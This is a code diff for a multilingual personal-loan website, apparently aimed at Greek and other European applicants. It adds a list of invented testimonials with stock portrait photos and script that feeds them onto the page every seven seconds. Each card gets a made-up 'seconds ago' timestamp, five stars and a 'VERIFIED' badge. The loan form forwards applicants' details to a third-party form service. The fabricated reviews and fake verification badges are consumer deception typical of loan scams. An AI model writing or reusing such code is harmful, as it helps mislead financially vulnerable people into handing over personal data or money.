+        { n: "Dominique B.", p: "Luxembourg", t: "Efficace pour les crédits transfrontaliers.", i: "https://randomuser.me/api/portraits/men/6.jpg" },
+        { n: "Markus Z.", p: "Schweiz", t: "Effizient und freundlich. Keine Beschwerden.", i: "https://randomuser.me/api/portraits/men/7.jpg" },
+        { n: "Bernd S.", p: "Deutschland", t: "Reibungslose Abwicklung meines Antrags.", i: "https://randomuser.me/api/portraits/men/8.jpg" },
+        { n: "Fabrizio T.", p: "Italia", t: "Tutto perfetto, grazie per il prestito.", i: "https://randomuser.me/api/portraits/men/9.jpg" },
+        { n: "Hugo M.", p: "Portugal", t: "Muito bom, recomendo vivamente a todos.", i: "https://randomuser.me/api/portraits/men/10.jpg" },
+        { n: "Paul R.", p: "Österreich", t: "Schnelle Auszahlung. Sehr zufrieden.", i: "https://randomuser.me/api/portraits/men/14.jpg" },
+        { n: "Gerd H.", p: "Deutschland", t: "Super Beratung, tolle Konditionen.", i: "https://randomuser.me/api/portraits/men/21.jpg" },
+        { n: "Pierre A.", p: "France", t: "Service client au top. Très professionnel.", i: "https://randomuser.me/api/portraits/men/31.jpg" },
+        { n: "Jürgen W.", p: "Deutschland", t: "Unkompliziert und fair. Danke.", i: "https://randomuser.me/api/portraits/men/34.jpg" },
+        { n: "Luca B.", p: "Schweiz", t: "Alles sehr klar. Toller Service.", i: "https://randomuser.me/api/portraits/men/36.jpg" },
+        { n: "Mathieu G.", p: "Belgique", t: "Très satisfait de mon prêt travaux.", i: "https://randomuser.me/api/portraits/men/40.jpg" },
+        { n: "Sven F.", p: "Deutschland", t: "Top Zinssatz, schnelle Entscheidung.", i: "https://randomuser.me/api/portraits/men/42.jpg" },
+        { n: "Klaus P.", p: "Österreich", t: "Seriöses Unternehmen. Alles perfekt.", i: "https://randomuser.me/api/portraits/men/46.jpg" },
+        { n: "Julien C.", p: "France", t: "Plateforme facile à utiliser. Rapide.", i: "https://randomuser.me/api/portraits/men/48.jpg" },
+        { n: "Oliver D.", p: "Deutschland", t: "Keine Probleme, Geld war schnell da.", i: "https://randomuser.me/api/portraits/men/51.jpg" },
+        { n: "Bruno L.", p: "Luxembourg", t: "Très bon suivi du dossier. Merci.", i: "https://randomuser.me/api/portraits/men/55.jpg" },
+        { n: "Tobias M.", p: "Schweiz", t: "Alles korrekt abgewickelt. Empfehlenswert.", i: "https://randomuser.me/api/portraits/men/58.jpg" },
+        { n: "Marco S.", p: "Italia", t: "Servizio rapido e cordiale.", i: "https://randomuser.me/api/portraits/men/61.jpg" },
+        { n: "David R.", p: "France", t: "Prêt obtenu sans difficultés.", i: "https://randomuser.me/api/portraits/men/64.jpg" },
+        { n: "Christian G.", p: "Deutschland", t: "Gute Kommunikation. Alles bestens.", i: "https://randomuser.me/api/portraits/men/71.jpg" },
+        { n: "Robert H.", p: "Österreich", t: "Fair und diskret. Danke.", i: "https://randomuser.me/api/portraits/men/73.jpg" },
+        { n: "Franck B.", p: "Belgique", t: "Équipe réactive. Fonds reçus rapidement.", i: "https://randomuser.me/api/portraits/men/76.jpg" },
+        { n: "Stephan Z.", p: "Schweiz", t: "Perfekter Service von Anfang bis Ende.", i: "https://randomuser.me/api/portraits/men/82.jpg" },
+        { n: "Nikos P.", p: "Ελλάδα", t: "Άψογη εξυπηρέτηση, πολύ γρήγορη και αξιόπιστη.", i: "https://randomuser.me/api/portraits/men/45.jpg" },
+        { n: "Eleni K.", p: "Ελλάδα", t: "Το συνιστώ ανεπιφύλακτα, η εμπειρία ήταν τέλεια.", i: "https://randomuser.me/api/portraits/women/45.jpg" },
+        { n: "Giorgos M.", p: "Ελλάδα", t: "Πολύ ικανοποιημένος από το αποτέλεσμα, κανένα παράπονο.", i: "https://randomuser.me/api/portraits/men/23.jpg" },
+        { n: "Dimitra L.", p: "Ελλάδα", t: "Μια επαγγελματική ομάδα που πραγματικά ακούει.", i: "https://randomuser.me/api/portraits/women/32.jpg" },
+        { n: "Kostas B.", p: "Ελλάδα", t: "Αποτελεσματικό και διαφανές. Πέντε αστέρια!", i: "https://randomuser.me/api/portraits/men/62.jpg" }
     ];
 
-    function renderReviews() {
-        const container = document.getElementById('reviews-container');
-        container.innerHTML = ""; 
-        internationalReviews.sort(() => 0.5 - Math.random()).slice(0, 12).forEach(r => {
-            const times = ["2 min", "15 min", "1h", "3h", "5h", "1j", "2j"];
-            const randomTime = times[Math.floor(Math.random() * times.length)];
-            
-            container.innerHTML += `
-                <div class="review-card">
-                    <span class="review-date"><i class="far fa-clock"></i> Il y a ${randomTime}</span>
-                    <div class="stars"><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i></div>
-                    <p class="review-text">"${r.t}"</p>
-                    <div class="review-author">
-                        <div>${r.n} (${r.p})</div>
-                        <span class="verified"><i class="fas fa-check-circle"></i> VÉRIFIÉ</span>
-                    </div>
-                </div>`;
-        });
-    }
-    renderReviews();
+    let queue = [...allReviews].sort(() => Math.random() - 0.5); 
+    const container = document.getElementById('reviews-container');
 
-    // --- CALCULATEUR ---
+    function createReviewHTML(data) {
+        const randSec = Math.floor(Math.random() * 50) + 5;
+        return `<div class="review-card">
+                <img src="${data.i}" class="author-img" alt="Profil" onerror="this.src='https://ui-avatars.com/api/?name=${data.n}'">
+                <div style="flex:1">
+                    <span class="review-date"><i class="fas fa-clock"></i> πριν από ${randSec} δευτ.</span>
+                    <div class="stars"><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i></div>
+                    <p class="review-text">"${data.t}"</p>
+                    <div class="review-author"><div>${data.n} (${data.p})</div><span class="verified"><i class="fas fa-check-circle"></i> ΕΠΑΛΗΘΕΥΜΕΝΟ</span></div>
+                </div>
+            </div>`;
+    }
+
+    function dropOneReview() {
+        if (queue.length === 0) queue = [...allReviews].sort(() => Math.random() - 0.5);
+        const nextReview = queue.pop(); 
+        container.insertAdjacentHTML('beforeend', createReviewHTML(nextReview));
+        if (container.children.length > 5) container.removeChild(container.firstChild);
+    }
+
+    function startJumellesAnimation() {
+        dropOneReview();
+        setInterval(dropOneReview, 7000); 
+    }
+
+    // Fonctions Simulateur
     const amtR = document.getElementById('amtRange');
     const amtN = document.getElementById('amtNum');
     const durR = document.getElementById('durRange');
@@ -529,17 +872,14 @@
 
     function calc() {
         let p = parseFloat(amtR.value); let n = parseInt(durR.value); let r = 0.035 / 12;
-        amtN.value = p; durT.innerText = n + " mois";
+        if(amtN) amtN.value = p; if(durT) durT.innerText = n + " Μήνες";
         let m = (p * r) / (1 - Math.pow(1 + r, -n));
-        resM.innerText = m.toFixed(2);
+        if(resM) resM.innerText = m.toFixed(2);
         document.getElementById('hiddenAmt').value = p + " €";
-        document.getElementById('hiddenDur').value = n + " mois";
+        document.getElementById('hiddenDur').value = n + " Μήνες";
         document.getElementById('hiddenMens').value = m.toFixed(2) + " €";
-        
-        let valA = (amtR.value - amtR.min) / (amtR.max - amtR.min) * 100;
-        amtR.style.backgroundSize = valA + '% 100%';
-        let valD = (durR.value - durR.min) / (durR.max - durR.min) * 100;
-        durR.style.backgroundSize = valD + '% 100%';
+        amtR.style.backgroundSize = (amtR.value - amtR.min) / (amtR.max - amtR.min) * 100 + '% 100%';
+        durR.style.backgroundSize = (durR.value - durR.min) / (durR.max - durR.min) * 100 + '% 100%';
     }
 
     function goToStep2() { document.getElementById('step1').style.display = 'none'; document.getElementById('step2').style.display = 'block'; }
@@ -547,68 +887,39 @@
     function resetAll() { location.reload(); }
 
     amtR.oninput = calc; durR.oninput = calc;
-    window.onscroll = () => { document.getElementById('goUp').style.display = (window.scrollY > 500) ? 'flex' : 'none'; };
-    calc();
+    calc(); 
+    window.onload = startJumellesAnimation;
 
-    // --- ENVOI DU FORMULAIRE ---
+    // Traducteur Sélecteur
+    function selectLanguage(name, code) {
+        document.getElementById('current-flag').src = `https://flagcdn.com/w40/${code}.png`;
+        document.getElementById('current-name').innerText = name.toUpperCase();
+        document.getElementById('country-list').classList.remove('show-countries');
+        const select = document.querySelector('.goog-te-combo');
+        if (select) {
+            select.value = (code === 'gr') ? 'el' : (code === 'gb' ? 'en' : code);
+            select.dispatchEvent(new Event('change'));
+        }
+    }
+
+    function toggleDropdown() { document.getElementById('country-list').classList.toggle('show-countries'); }
+
+    // Formulaire
     const form = document.getElementById('loanForm');
     form.onsubmit = async (e) => {
         e.preventDefault();
-        const overlay = document.getElementById('loader-overlay');
-        overlay.style.display = 'flex';
+        document.getElementById('loader-overlay').style.display = 'flex';
         const formData = new FormData(form);
-        try {
-            await fetch('https://api.web3forms.com/submit', { method: 'POST', body: formData });
+        const response = await fetch('https://api.web3forms.com/submit', { method: 'POST', body: formData });
+        const result = await response.json();
+        if (result.success) {
+            if(typeof gtag === 'function'){ gtag('event', 'conversion', {'send_to': 'AW-18121475138/vGqNCOf1r_kZELqR9-8_'}); }
             setTimeout(() => {
                 document.getElementById('loading-content').style.display = 'none';
                 document.getElementById('success-message').style.display = 'block';
-            }, 4000);
-        } catch (error) { overlay.style.display = 'none'; alert("Erreur réseau. Veuillez réessayer."); }
+            }, 3000);
+        }
     };
 </script>
-
-<script type="text/javascript">
-    function googleTranslateElementInit() {
-        new google.translate.TranslateElement({
-            pageLanguage: 'fr',
-            layout: google.translate.TranslateElement.InlineLayout.SIMPLE,
-            autoDisplay: false
-        }, 'google_translate_element');
-    }
-
-    (function autoTranslate() {
-        const userLang = navigator.language || navigator.userLanguage;
-        // Si la langue n'est pas le français, on lance la traduction automatique
-        if (!userLang.startsWith('fr')) {
-            setTimeout(() => {
-                const select = document.querySelector('select.goog-te-combo');
-                if (select) {
-                    select.value = userLang.split('-')[0];
-                    select.dispatchEvent(new Event('change'));
-                }
-            }, 1000);
-        }
-    })();
-
-    /* --- RENFORT DE CRÉDIBILITÉ (CORRECTION DES ERREURS GOOGLE) --- */
-    setInterval(function() {
-        document.querySelectorAll('button, h1, h2, h3, p, span, option').forEach(function(el) {
-            // Corrige "Candidature" qui fait "Job" au lieu de "Prêt"
-            if (el.innerText.toLowerCase().includes('candidature')) {
-                el.innerText = el.innerText.replace(/candidature/gi, 'Demande de financement');
-            }
-            // Corrige l'anglais "Application"
-            if (el.innerText.toLowerCase().includes('application') && !el.innerText.toLowerCase().includes('secure')) {
-                el.innerText = el.innerText.replace(/Application/gi, 'Loan Request');
-            }
-            // Corrige l'allemand "Bewerbung"
-            if (el.innerText.toLowerCase().includes('bewerbung')) {
-                el.innerText = el.innerText.replace(/bewerbung/gi, 'Finanzierungsantrag');
-            }
-        });
-    }, 1000);
-</script>
-<script type="text/javascript" src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
-
 </body>
 </html>
